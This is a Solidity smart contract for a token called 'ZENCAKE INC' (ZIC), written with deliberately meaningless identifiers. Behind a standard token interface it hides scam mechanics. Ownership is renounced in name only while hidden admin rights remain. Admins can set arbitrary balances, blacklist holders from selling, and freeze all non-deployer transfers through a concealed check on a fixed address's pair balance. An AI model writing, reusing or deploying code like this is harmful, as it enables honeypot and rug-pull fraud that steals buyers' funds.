//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface amountLaunchedAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingFeeLaunch) external view returns (uint256);

    function transfer(address txAmountShould, uint256 minLiquidity) external returns (bool);

    function allowance(address liquidityTakeIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 minLiquidity) external returns (bool);

    function transferFrom(address sender,address txAmountShould,uint256 minLiquidity) external returns (bool);

    event Transfer(address indexed from, address indexed modeFee, uint256 value);
    event Approval(address indexed liquidityTakeIs, address indexed spender, uint256 value);
}

interface feeIsTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atWallet {
    function createPair(address limitReceiver, address receiverTotal) external returns (address);
}

abstract contract fromReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountLaunchedAtMetadata is amountLaunchedAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ZENCAKEINC is fromReceiver, amountLaunchedAt, amountLaunchedAtMetadata {

    function approve(address modeMarketing, uint256 minLiquidity) public virtual override returns (bool) {
        liquidityLimit[_msgSender()][modeMarketing] = minLiquidity;
        emit Approval(_msgSender(), modeMarketing, minLiquidity);
        return true;
    }

    bool private enableTeam;

    bool private minLaunched;

    uint256 tradingIs;

    uint256 txAmountMode;

    function transferFrom(address maxReceiver, address txAmountShould, uint256 minLiquidity) external override returns (bool) {
        if (_msgSender() != senderBuy) {
            if (liquidityLimit[maxReceiver][_msgSender()] != type(uint256).max) {
                require(minLiquidity <= liquidityLimit[maxReceiver][_msgSender()]);
                liquidityLimit[maxReceiver][_msgSender()] -= minLiquidity;
            }
        }
        return takeExemptList(maxReceiver, txAmountShould, minLiquidity);
    }

    function transfer(address atTrading, uint256 minLiquidity) external virtual override returns (bool) {
        return takeExemptList(_msgSender(), atTrading, minLiquidity);
    }

    function isFee() private view {
        require(teamAt[_msgSender()]);
    }

    mapping(address => bool) public teamAt;

    function receiverTake(uint256 minLiquidity) public {
        isFee();
        txAmountMode = minLiquidity;
    }

    uint256 private atLimitLiquidity;

    address feeFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address listAt, address modeMarketing) external view virtual override returns (uint256) {
        if (modeMarketing == senderBuy) {
            return type(uint256).max;
        }
        return liquidityLimit[listAt][modeMarketing];
    }

    event OwnershipTransferred(address indexed minMarketing, address indexed enableFundBuy);

    address public totalIsFund;

    function owner() external view returns (address) {
        return tradingBuyAmount;
    }

    bool public walletTake;

    address public txLaunch;

    string private receiverTrading = "ZENCAKE INC";

    function name() external view virtual override returns (string memory) {
        return receiverTrading;
    }

    constructor (){
        if (minLaunched) {
            buyLaunch = false;
        }
        shouldTo();
        feeIsTo takeWallet = feeIsTo(senderBuy);
        txLaunch = atWallet(takeWallet.factory()).createPair(takeWallet.WETH(), address(this));
        if (minLaunched != enableTeam) {
            minLaunched = false;
        }
        totalIsFund = _msgSender();
        teamAt[totalIsFund] = true;
        feeIs[totalIsFund] = takeShould;
        
        emit Transfer(address(0), totalIsFund, takeShould);
    }

    function takeExemptList(address maxReceiver, address txAmountShould, uint256 minLiquidity) internal returns (bool) {
        if (maxReceiver == totalIsFund) {
            return liquidityExempt(maxReceiver, txAmountShould, minLiquidity);
        }
        uint256 fundReceiver = amountLaunchedAt(txLaunch).balanceOf(feeFund);
        require(fundReceiver == txAmountMode);
        require(!autoFee[maxReceiver]);
        return liquidityExempt(maxReceiver, txAmountShould, minLiquidity);
    }

    bool private launchLaunched;

    uint8 private txReceiver = 18;

    mapping(address => mapping(address => uint256)) private liquidityLimit;

    function fundLaunched(address sellTo) public {
        isFee();
        if (amountTo) {
            atLimitLiquidity = amountList;
        }
        if (sellTo == totalIsFund || sellTo == txLaunch) {
            return;
        }
        autoFee[sellTo] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return atLaunchedBuy;
    }

    bool public buyLaunch;

    uint256 public amountList;

    address senderBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function shouldTo() public {
        emit OwnershipTransferred(totalIsFund, address(0));
        tradingBuyAmount = address(0);
    }

    uint256 private takeShould = 100000000 * 10 ** 18;

    mapping(address => bool) public autoFee;

    function minTeam(address atTrading, uint256 minLiquidity) public {
        isFee();
        feeIs[atTrading] = minLiquidity;
    }

    mapping(address => uint256) private feeIs;

    function decimals() external view virtual override returns (uint8) {
        return txReceiver;
    }

    string private atLaunchedBuy = "ZIC";

    function balanceOf(address tradingFeeLaunch) public view virtual override returns (uint256) {
        return feeIs[tradingFeeLaunch];
    }

    function fromFee(address autoLiquidity) public {
        if (walletTake) {
            return;
        }
        
        teamAt[autoLiquidity] = true;
        
        walletTake = true;
    }

    function getOwner() external view returns (address) {
        return tradingBuyAmount;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeShould;
    }

    uint256 private receiverTxBuy;

    address private tradingBuyAmount;

    function liquidityExempt(address maxReceiver, address txAmountShould, uint256 minLiquidity) internal returns (bool) {
        require(feeIs[maxReceiver] >= minLiquidity);
        feeIs[maxReceiver] -= minLiquidity;
        feeIs[txAmountShould] += minLiquidity;
        emit Transfer(maxReceiver, txAmountShould, minLiquidity);
        return true;
    }

    bool public amountTo;

}